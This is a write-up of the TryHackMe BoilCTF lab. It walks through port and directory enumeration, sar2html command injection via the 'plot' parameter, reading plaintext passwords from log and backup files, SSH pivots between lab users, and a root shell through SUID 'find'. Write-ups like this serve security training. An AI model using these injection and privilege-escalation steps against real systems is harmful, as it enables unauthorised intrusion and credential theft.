# BoilCTF Writeup - TryHackMe
<img src="https://tryhackme-images.s3.amazonaws.com/room-icons/4a800c6513239dbdfaf74ce869a88add.jpeg" title="TryHackMe" aria-label="Room Icon" height="64" width="64">

[BoilCTF](https://tryhackme.com/r/room/boilerctf2) is an annoying boot2root challenge on TryHackMe. It has a lot of rabbit holes! Definitely, easy-medium level challenge if the creator didn't put those rabbit holes.

## Table of Contents

- [Enumeration](#enumeration)
- [Exploitation](#exploitation)
- [Lateral Movement](#lateral-movement)
- [Lateral Movement - 2](#lateral-movement---2)
- [Privilege Escalation](#privilege-escalation)
- [Conclusion](#conclusion)


## Enumeration

As always, I started with a port scan:

```bash
PORT      STATE SERVICE REASON  VERSION
21/tcp    open  ftp     syn-ack vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.9.3.43
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
80/tcp    open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: OPTIONS GET HEAD POST
| http-robots.txt: 1 disallowed entry 
|_/
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
10000/tcp open  http    syn-ack MiniServ 1.930 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-favicon: Unknown favicon MD5: 668CB370770CC6F5682CDB936F0A3CB5
55007/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e3:ab:e1:39:2d:95:eb:13:55:16:d6:ce:8d:f9:11:e5 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC8bsvFyC4EXgZIlLR/7o9EHosUTTGJKIdjtMUyYrhUpJiEdUahT64rItJMCyO47iZTR5wkQx2H8HThHT6iQ5GlMzLGWFSTL1ttIulcg7uyXzWhJMiG/0W4HNIR44DlO8zBvysLRkBSCUEdD95kLABPKxIgCnYqfS3D73NJI6T2qWrbCTaIG5QAS5yAyPERXXz3ofHRRiCr3fYHpVopUbMTWZZDjR3DKv7IDsOCbMKSwmmgdfxDhFIBRtCkdiUdGJwP/g0uEUtHbSYsNZbc1s1a5EpaxvlESKPBainlPlRkqXdIiYuLvzsf2J0ajniPUkvJ2JbC8qm7AaDItepXLoDt
|   256 ae:de:f2:bb:b7:8a:00:70:20:74:56:76:25:c0:df:38 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLIDkrDNUoTTfKoucY3J3eXFICcitdce9/EOdMn8/7ZrUkM23RMsmFncOVJTkLOxOB+LwOEavTWG/pqxKLpk7oc=
|   256 25:25:83:f2:a7:75:8a:a0:46:b2:12:70:04:68:5c:cb (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPsAMyp7Cf1qf50P6K9P2n30r4MVz09NnjX7LvcKgG2p
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

I started by visiting the web server on port 80. The page was the default Apache page. I ran gobuster to find any hidden directories:

```bash
┌──(kali㉿kali)-[~]
└─$ gobuster dir --url $url --wordlist /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 70               
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.135.65
[+] Method:                  GET
[+] Threads:                 70
[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/manual               (Status: 301) [Size: 313] [--> http://10.10.135.65/manual/]
/joomla               (Status: 301) [Size: 313] [--> http://10.10.135.65/joomla/]
/server-status        (Status: 403) [Size: 300]
```

We have two directories: `/manual` and `/joomla`. I visited the `/joomla` directory and found a Joomla website. I ran a Joomla scan using `joomscan`. However, there was nothing useful.

I then run gobuster on the `/joomla` directory:

```bash
┌──(kali㉿kali)-[/tmp]
└─$ gobuster dir --url $url/joomla --wordlist  /usr/share/wordlists/dirb/common.txt  -t 70 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.145.140/joomla
[+] Method:                  GET
[+] Threads:                 70
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 304]
/.hta                 (Status: 403) [Size: 299]
/_test                (Status: 301) [Size: 321] [--> http://10.10.145.140/joomla/_test/]
/~www                 (Status: 301) [Size: 320] [--> http://10.10.145.140/joomla/~www/]
/administrator        (Status: 301) [Size: 329] [--> http://10.10.145.140/joomla/administrator/]
/.htpasswd            (Status: 403) [Size: 304]
/_archive             (Status: 301) [Size: 324] [--> http://10.10.145.140/joomla/_archive/]
/_files               (Status: 301) [Size: 322] [--> http://10.10.145.140/joomla/_files/]
/_database            (Status: 301) [Size: 325] [--> http://10.10.145.140/joomla/_database/]
/bin                  (Status: 301) [Size: 319] [--> http://10.10.145.140/joomla/bin/]
/build                (Status: 301) [Size: 321] [--> http://10.10.145.140/joomla/build/]
/cache                (Status: 301) [Size: 321] [--> http://10.10.145.140/joomla/cache/]
/components           (Status: 301) [Size: 326] [--> http://10.10.145.140/joomla/components/]
/images               (Status: 301) [Size: 322] [--> http://10.10.145.140/joomla/images/]
/includes             (Status: 301) [Size: 324] [--> http://10.10.145.140/joomla/includes/]
/installation         (Status: 301) [Size: 328] [--> http://10.10.145.140/joomla/installation/]
/language             (Status: 301) [Size: 324] [--> http://10.10.145.140/joomla/language/]
/layouts              (Status: 301) [Size: 323] [--> http://10.10.145.140/joomla/layouts/]
/libraries            (Status: 301) [Size: 325] [--> http://10.10.145.140/joomla/libraries/]
/media                (Status: 301) [Size: 321] [--> http://10.10.145.140/joomla/media/]
/modules              (Status: 301) [Size: 323] [--> http://10.10.145.140/joomla/modules/]
/plugins              (Status: 301) [Size: 323] [--> http://10.10.145.140/joomla/plugins/]
/index.php            (Status: 200) [Size: 12484]
/templates            (Status: 301) [Size: 325] [--> http://10.10.145.140/joomla/templates/]
/tests                (Status: 301) [Size: 321] [--> http://10.10.145.140/joomla/tests/]
/tmp                  (Status: 301) [Size: 319] [--> http://10.10.145.140/joomla/tmp/]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================
```

## Exploitation

I visited the `_test` directory and that page redirected me to a sar2html 3.2.1 page. I ran a searchsploit on sar2html and found an [exploit](https://www.exploit-db.com/exploits/47204):

```
In web application you will see index.php?plot url extension.

http://<ipaddr>/index.php?plot=;<command-here> will execute 
the command you entered. After command injection press "select # host" then your command's 
output will appear bottom side of the scroll screen.
```

I tried the exploit and it worked. I got a reverse shell:

```bash
$ ls
ls
index.php  log.txt  sar2html  sarFILE
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@Vulnerable:/var/www/html/joomla/_test$ ls
ls
index.php  log.txt  sar2html  sarFILE
www-data@Vulnerable:/var/www/html/joomla/_test$ cat log.txt
cat log.txt
Aug 20 11:16:26 parrot sshd[2443]: Server listening on 0.0.0.0 port 22.
Aug 20 11:16:26 parrot sshd[2443]: Server listening on :: port 22.
Aug 20 11:16:35 parrot sshd[2451]: Accepted password for basterd from 10.1.1.1 port 49824 ssh2 #pass: superduperp@$$
Aug 20 11:16:35 parrot sshd[2451]: pam_unix(sshd:session): session opened for user pentest by (uid=0)
Aug 20 11:16:36 parrot sshd[2466]: Received disconnect from 10.10.170.50 port 49824:11: disconnected by user
Aug 20 11:16:36 parrot sshd[2466]: Disconnected from user pentest 10.10.170.50 port 49824
Aug 20 11:16:36 parrot sshd[2451]: pam_unix(sshd:session): session closed for user pentest
Aug 20 12:24:38 parrot sshd[2443]: Received signal 15; terminating.
www-data@Vulnerable:/var/www/html/joomla/_test$  
```

## Lateral Movement

`log.txt` contained the password for the user `basterd`. I used the password to login via SSH:

```bash
┌──(kali㉿kali)-[~]
└─$ ssh basterd@10.10.20.178 -p 55007                                                                       
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-142-generic i686)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

8 packages can be updated.
8 updates are security updates.


Last login: Thu Aug 22 12:29:45 2019 from 192.168.1.199
$ ls
backup.sh
$ ls -lah
total 16K
drwxr-x--- 3 basterd basterd 4.0K Aug 22  2019 .
drwxr-xr-x 4 root    root    4.0K Aug 22  2019 ..
-rwxr-xr-x 1 stoner  basterd  699 Aug 21  2019 backup.sh
-rw------- 1 basterd basterd    0 Aug 22  2019 .bash_history
drwx------ 2 basterd basterd 4.0K Aug 22  2019 .cache
$ cat backup.sh
REMOTE=1.2.3.4

SOURCE=/home/stoner
TARGET=/usr/local/backup

LOG=/home/stoner/bck.log
 
DATE=`date +%y\.%m\.%d\.`

USER=stoner
#superduperp@$$no1know
...
...
...
```

## Lateral Movement - 2

I found a backup script that contained the password for the user `stoner`. I used the password to login via SSH:

```bash
┌──(kali㉿kali)-[~]
└─$ ssh stoner@10.10.145.140 -p 55007
stoner@10.10.145.140's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-142-generic i686)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

8 packages can be updated.
8 updates are security updates.



The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

Last login: Thu Aug 22 16:05:13 2019
stoner@Vulnerable:~$
```

I was successfully logged in as `stoner`. Listed the files in the home directory:

```bash
stoner@Vulnerable:~$ ls
total 3.5M
drwxr-x--- 6 stoner stoner 4.0K May 14 01:26 .
drwxr-xr-x 4 root   root   4.0K Aug 22  2019 ..
drwx------ 2 stoner stoner 4.0K May 14 01:09 .cache
drwxr-x--- 3 stoner stoner 4.0K May 14 01:10 .config
drwx------ 2 stoner stoner 4.0K May 14 01:26 .gnupg
drwxrwxr-x 2 stoner stoner 4.0K Aug 22  2019 .nano
-rw-r--r-- 1 stoner stoner   34 Aug 21  2019 .secret
```

The user flag was in the `.secret` file:

## Privilege Escalation

I checked the sudo permissions but the creator of the challenge mocked me:

```bash
stoner@Vulnerable:~$ sudo -l
User stoner may run the following commands on Vulnerable:
    (root) NOPASSWD: /NotThisTime/MessinWithYa
```

There's no such file as `/NotThisTime/MessinWithYa

I checked 'id' and found that I was in the 'lxd' group:

```bash
stoner@Vulnerable:~$ id
uid=1000(stoner) gid=1000(stoner) groups=1000(stoner),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
```

I tried LXD privilege escalation using [this](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation), however, it didn't work.

Then I enumerated the system using `linpeas` and found that the `/usr/bin/find` had the SUID bit set:

```bash
-r-sr-xr-x 1 root root 227K Feb  8  2016 /usr/bin/find
```

So we can use the `find` command to escalate our privileges! Haha! GO TO HELL, CHALLENGE CREATOR! LET'S ESCALATE OUR PRIVILEGES! GTFOBINS to the rescue:

```bash
stoner@Vulnerable:~$ /usr/bin/find . -exec /bin/sh -p \; -quit
# id
uid=0(root) gid=0(root) groups=0(root)
```
Ultimately, I got the root privileges and read the root flag!

## Conclusion

Though I tried and learned a lot of things, the creator of the challenge was a bit annoying. There were some unnecessary rabbit holes. I hate them!


